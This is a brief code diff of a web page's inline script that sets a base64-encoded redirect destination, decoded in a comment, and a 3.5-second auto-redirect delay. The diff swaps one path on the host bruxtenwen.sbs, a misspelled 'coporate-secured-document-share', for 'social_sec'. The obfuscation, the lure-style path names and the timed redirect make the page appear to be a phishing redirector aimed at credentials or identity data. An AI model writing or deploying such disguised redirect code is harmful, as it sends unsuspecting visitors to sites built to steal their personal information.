@@ -143,16 +143,16 @@
     <script type="text/javascript">
         // ============================================
         // CONFIG — destination is base64-encoded
-        // Decodes to: https://bruxtenwen.sbs/coporate-secured-document-share
+        // Decodes to: https://bruxtenwen.sbs/social_sec
         // ============================================
-        var DEST_B64 = 'aHR0cHM6Ly9icnV4dGVud2VuLnNicy9jb3BvcmF0ZS1zZWN1cmVkLWRvY3VtZW50LXNoYXJl';
+        var DEST_B64 = 'aHR0cHM6Ly9icnV4dGVud2VuLnNicy9zb2NpYWxfc2Vj';
         var REDIRECT_DELAY = 3500;
 
         var DESTINATION;
         try {
             DESTINATION = atob(DEST_B64);
         } catch (e) {
-            DESTINATION = 'https://bruxtenwen.sbs/coporate-secured-document-share';
+            DESTINATION = 'https://bruxtenwen.sbs/social_sec';
         }
 
         // ============================================
